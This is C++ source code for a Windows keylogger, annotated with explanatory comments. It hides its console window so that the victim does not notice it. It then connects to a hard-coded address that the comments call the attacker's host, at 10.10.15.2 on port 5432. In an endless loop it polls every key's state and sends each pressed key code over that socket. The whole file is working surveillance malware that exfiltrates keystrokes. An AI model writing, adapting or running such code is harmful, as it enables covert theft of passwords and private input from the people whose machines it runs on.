// disable deprecated API warnings
#define _WINSOCK_DEPRECATED_NO_WARNINGS
// telling the compiler to link with library ws2_32
#pragma comment(lib, "Ws2_32.lib") // we need it to use networking functionality

#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string> //standard libraries
#include <winsock2.h> // sends data and and optional control information from sockets
#include <Windows.h>

int main(){
	ShowWindow(GetConsoleWindow() , SW_HIDE); //hide console window to not be obvious to the victim
//that this program is running
char KEY; //to hold a single key
WSADATA WSAData; // from the winsock.h library, the WSADATA structure contains info about the windows sockets implementation
SOCKET server;
SOCKADDR_IN addr; //structure for handling internet addresses	
	
	
	
	WSAStartup(MAKEWORD(2,0),&WSAData); // a function that initiates use of the winsock DLL by a process, DLL means a dynamic link library
// is a file that contains commonly used program functions code on PCs that run the Windows os. 
server = socket(AF_INET,SOCK_STREAM,0); // parameters are domain,type,protocol, AF_INET is internet domain, SOCK_STREAM means that it is a TCP socket
//AF_INET is for IPV4

addr.sin_addr.s_addr = inet_addr("10.10.15.2"); //this is the ip address of the place we want
//to send the stolen data to aka the attacker
addr.sin_family = AF_INET;
addr.sin_port = htons(5432);//the port the data is sent over
connect(server, (SOCKADDR *)&addr, sizeof(addr));


while (true){ // runs infinitely
Sleep(10);
for (int KEY = 0x8 ; KEY<0xFF ; KEY++){ //check if the  key is in the range of 0x8 to 0xFF
	if (GetAsyncKeyState(KEY) & 0x8000) { //check if that key is pressed
                char buffer[2];
                buffer[0] = KEY; // send the ASCII code for key
                send(server, buffer, sizeof(buffer), 0);
            }
	
}	
	
}



closesocket(server);
    WSACleanup();



	return 0;
}
